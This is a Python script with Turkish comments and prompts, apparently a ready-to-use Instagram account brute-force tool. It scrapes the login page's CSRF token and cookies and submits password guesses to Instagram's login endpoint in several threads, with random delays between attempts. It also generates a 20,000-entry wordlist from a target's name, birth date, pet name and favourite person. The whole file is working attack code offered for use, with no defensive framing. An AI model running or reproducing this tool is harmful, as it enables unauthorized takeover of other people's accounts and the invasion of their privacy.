import os
import requests
from datetime import datetime
import threading
import random
import time
import subprocess
import string

# Ekranı temizle
def clear_screen():
    subprocess.run("cls" if os.name == "nt" else "clear", shell=True)

# Başlık gösterimi
def display_header():
    clear_screen()
    print("\033[91m" + "PASG" + "\033[0m")  # Kırmızı font
    print("Author: arxsxd")

# Şifre dosyasını oku
def read_passwords(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except Exception as e:
        log_error(f"Hata: Şifre dosyası okunamadı. {str(e)}")
        return []

# CSRF token ve diğer giriş bilgilerini al
def get_csrf_and_cookies(session):
    try:
        login_page_url = "https://www.instagram.com/accounts/login/"
        response = session.get(login_page_url)

        if response.status_code != 200:
            log_error(f"Giriş sayfasına erişim sağlanamadı. HTTP Durum Kodu: {response.status_code}")
            return None, None

        csrf_token = response.cookies.get('csrftoken')
        cookies = response.cookies.get_dict()

        if not csrf_token:
            log_error("CSRF token bulunamadı, sayfa yapısı değişmiş olabilir.")

        return csrf_token, cookies
    except Exception as e:
        log_error(f"CSRF ve çerezler alınırken hata: {str(e)}")
        return None, None

# Instagram API üzerinden giriş denemesi
def login_with_api(session, username, password, csrf_token, cookies):
    login_url = "https://www.instagram.com/accounts/login/ajax/"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRFToken': csrf_token,
        'Referer': 'https://www.instagram.com/accounts/login/',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    timestamp = int(datetime.now().timestamp())

    data = {
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
        'username': username,
        'queryParams': '{}',
        'optIntoOneTap': 'false'
    }

    try:
        login_response = session.post(login_url, headers=headers, data=data, cookies=cookies)

        if login_response.ok:
            response_json = login_response.json()
            if response_json.get("authenticated"):
                print("\033[92m" + "ACCESS LOGIN: " + password + "\033[0m")
                return password
            elif response_json.get("message") == "The password you entered is incorrect":
                print("\033[91m" + "DENIED: " + password + "\033[0m")
            elif "checkpoint_required" in response_json:
                print("\033[93m" + "2FA veya Ek Güvenlik Gerekiyor: " + password + "\033[0m")
                return None
            else:
                log_error(f"Beklenmeyen yanıt alındı: {response_json}")
        else:
            log_error(f"Giriş denemesi başarısız. HTTP Durum Kodu: {login_response.status_code}. Yanıt: {login_response.text}")

    except Exception as e:
        log_error(f"Giriş denemesi sırasında hata: {str(e)}")

# Her bir iş parçacığı için brute force denemesi
def brute_force_attempt(session, username, passwords):
    csrf_token, cookies = get_csrf_and_cookies(session)
    if not csrf_token or not cookies:
        log_error("CSRF token veya çerezler alınamadı, brute force işlemi başlatılamıyor.")
        return

    for password in passwords:
        print(f"Giriş denemesi: {password}")
        login_with_api(session, username, password, csrf_token, cookies)
        time.sleep(random.uniform(10, 15))  # Rastgele bekleme süresi

# Çoklu iş parçacığı oluşturma
def start_brute_force(username, passwords, thread_count=5):
    session = requests.Session()

    # Her iş parçacığı için şifre listesini böl
    threads = []
    for i in range(thread_count):
        thread_passwords = passwords[i::thread_count]  # Şifre listesini bölerek her iş parçacığına dağıt
        thread = threading.Thread(target=brute_force_attempt, args=(session, username, thread_passwords))
        threads.append(thread)
        thread.start()

    # Tüm iş parçacıklarının tamamlanmasını bekle
    for thread in threads:
        thread.join()

def log_error(message):
    with open("hata_log.txt", "a") as log_file:
        log_file.write(f"{datetime.now()}: {message}\n")
    print("\033[91m" + message + "\033[0m")

# Şifre oluşturucu
def password_generator():
    first_name = input("Adınızı girin: ")
    last_name = input("Soyadınızı girin: ")
    birth_date = input("Doğum tarihinizi girin (YYYY-MM-DD): ")
    pet_name = input("Evcil hayvan ismini girin: ")
    favorite_person = input("En sevdiğiniz kişinin ismini girin: ")

    passwords = set()  # Tekrarları önlemek için set kullanıyoruz

    while len(passwords) < 20000:  # 20,000 şifre oluştur
        # Karmaşık şifre oluşturmak için rastgele karakterler ekleyelim
        random_number = str(random.randint(1000, 9999))
        special_character = random.choice(string.punctuation)  # Rastgele bir özel karakter seç
        password = f"{first_name}{last_name}{random_number}{special_character}{pet_name}{favorite_person}"
        
        # Şifreyi karmaşık hale getirmek için rastgele büyük harf ekleyelim
        if random.choice([True, False]):
            password += random.choice(string.ascii_uppercase)
        
        # Şifrelerin uzunluğu 12 ile 16 arasında olacak şekilde ayarlama
        if 12 <= len(password) <= 16:
            passwords.add(password)
        elif len(password) < 12:
            passwords.add(password + random.choice(string.ascii_lowercase))  # Küçük harf ekle
        elif len(password) > 16:
            passwords.add(password[:16])  # Uzunluğu 16 karaktere düşür

    with open("passwords.txt", "w") as file:
        for password in passwords:
            file.write(password + "\n")
    print("\033[92m" + "Şifreler oluşturuldu ve passwords.txt dosyasına kaydedildi." + "\033[0m")

# Ana program
def main():
    display_header()
    
    while True:
        print("\nSeçenekler:")
        print("1. Şifre Oluşturucu")
        print("2. Brute Force Denemesi")
        print("3. Çıkış")
        choice = input("Bir seçenek girin (1-3): ")
        
        if choice == '1':
            password_generator()
        elif choice == '2':
            username = input("Instagram kullanıcı adınızı girin: ")
            password_file = input("Şifre dosyasının yolunu girin (default: passwords.txt): ") or "passwords.txt"
            passwords = read_passwords(password_file)
            if passwords:
                thread_count = int(input("Kaç iş parçacığı kullanmak istersiniz? (default: 5): ") or 5)
                start_brute_force(username, passwords, thread_count)
        elif choice == '3':
            print("Çıkılıyor...")
            break
        else:
            print("Geçersiz seçenek, lütfen tekrar deneyin.")

if __name__ == "__main__":
    main()
